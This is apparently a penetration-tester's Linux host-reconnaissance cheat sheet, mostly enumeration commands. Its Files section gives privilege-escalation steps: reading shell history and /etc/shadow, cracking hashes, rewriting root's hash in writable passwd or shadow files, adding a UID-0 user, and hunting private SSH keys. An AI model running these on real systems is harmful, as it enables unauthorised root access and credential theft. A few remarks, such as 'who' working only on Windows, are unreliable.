# Host Recon

{% hint style="info" %}
For automated enumeration of potential PE vectors see [here](../../infra-tools/pe-scripts.md).
{% endhint %}

## Help

```bash
# List available commands
compgen -c | sort | less
compgen -a | sort | less

# Help for a specified command
man <command>
<command> --help
```

## Networking

{% tabs %}
{% tab title="Network Info" %}
General networking information, such as interfaces, IP addresses, and DNS:

```bash
ip addr show
ip a
ifconfig -a # deprecated

# Show interfaces
ip link show
```
{% endtab %}

{% tab title="ARP Table" %}
Check recent communications via the ARP table:

```bash
ip route
ip neigh
```
{% endtab %}

{% tab title="Active Connections" %}
List active TCP and UDP connections:

```bash
ss -tulnp
netstat -tulnp # deprecated
```
{% endtab %}

{% tab title="Routes" %}
List recent and persistent routes:

```bash
ip route show
ip r
route -n # legacy
```
{% endtab %}
{% endtabs %}

## System

{% hint style="success" %}
[`pspy`](../../infra-tools/pspy.md) can be used on the target to enumerate real-time system information!
{% endhint %}

{% tabs %}
{% tab title="General Info" %}
{% code overflow="wrap" %}
```bash
# General system information
neofetch
hostnamectl
uname -a

# Name of the host
hostname

# Kernel version & distro info
uname -r
cat /etc/os-release

# Terminal history file
cat ~/.bash_history
cat ~/.zsh_history
history

# Environment variables
printenv
env

# Named pipes
ls -l /proc/sys/fs/pipe-max-size
lsof

# sudo version
sudo --version
```
{% endcode %}
{% endtab %}

{% tab title="Packages" %}
```bash
# Installed packages

# Debian / Ubuntu (APT-based)
dpkg -l
apt list --installed

# RedHat / CentOS / Fedora (RPM-based)
rpm -qa
dnf list installed
yum list installed

# Arch Linux / Manjaro (Pacman)
pacman -Q

# Snap packages
snap list

# Flatpak packages
flatpak list

# Homebrew (macOS or Linux)
brew list --versions
```
{% endtab %}

{% tab title="Processes" %}
```bash
# List running processes
ps aux

# Information about a specific process
ps -p <PID> -f
cat /proc/<PID>/status
```
{% endtab %}

{% tab title="Services" %}
```bash
ps -eo pid,cmd
systemctl
```
{% endtab %}
{% endtabs %}

## Users & Groups

{% tabs %}
{% tab title="Users" %}
{% code overflow="wrap" %}
```bash
# Current user
whoami

# List current user's privileges
sudo -l

# List current user's information
id
getent passwd $(whoami)

# List local users
cut -d: -f1 /etc/passwd
getent passwd

# List active (logged-on) users (works only on Windows Servers)
who

# Elevated permissions
sudo -l
```
{% endcode %}
{% endtab %}

{% tab title="Groups" %}
```bash
# List current user's groups
groups
id -Gn

# List local groups
getent group

# List group members
getent group <group>

# Check what files the group have permissions on
find / -group filter 2>/dev/null
```
{% endtab %}
{% endtabs %}

## Files

{% tabs %}
{% tab title="General" %}
{% code overflow="wrap" %}
```bash
# List all (including) hidden files
ls -la

# Include subdirectories
ls -laR

# Search for a specific file
find / -type f -name "local.txt" 2>/dev/null
locate local.txt

# Case-insensitive search
find / -type f -iname "local.txt" 2>/dev/null
```
{% endcode %}
{% endtab %}

{% tab title="SUIDs" %}
{% code overflow="wrap" %}
```bash
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
```
{% endcode %}
{% endtab %}

{% tab title="Shadow" %}
Check permissions:

```bash
ls -l /etc/shadow
```

If it is writable, create/modify a user:

```bash
# Generate a new password hash
openssl passwd -1 -salt xyz newpassword
# Replace root's password with the new one
echo 'root:$1$xyz$YOUR_GENERATED_HASH' | chpasswd -e
# Switch to root
su - root
```

If it is readable, copy `shadow` and `passwd` locally and crack them:

{% code overflow="wrap" %}
```bash
# Unshadow files
unshadow passwd shadow > hashes.txt
# Crack with john
john --wordlist=rockyou.txt hashes.txt
# Crack with hashcat
hashcat -m1800 hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
{% endtab %}

{% tab title="Passwd" %}
Check the file's permissions:

```
ls -l /etc/passwd
```

If it is writable, `root`'s password can be changed:

{% code overflow="wrap" %}
```bash
# Generate a new hash
openssl passwd -1 -salt evil password123

# Place the hash between the first and second ':' of root
sed -i 's/^root:[^:]*:/root:$1$evil$F9LZzU/LJjH7ZQZzJX.Zn1:/' /etc/passwd

# Switch user
sudo su
```
{% endcode %}

Or, a new root user can be created:

{% code overflow="wrap" %}
```bash
# Append a new user entry
echo "newroot:\$1\$evil\$F9LZzU/LJjH7ZQZzJX.Zn1:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch user
su newroot
```
{% endcode %}
{% endtab %}

{% tab title="SSH Keys" %}
```bash
$ sudo find /home -name "id_rsa" -o -name "id_dsa"
```
{% endtab %}
{% endtabs %}

## Scheduled Jobs

```bash
# Print jobs
crontab -l
cat /etc/crontab
cat /var/log/syslog | grep "CRON"
```
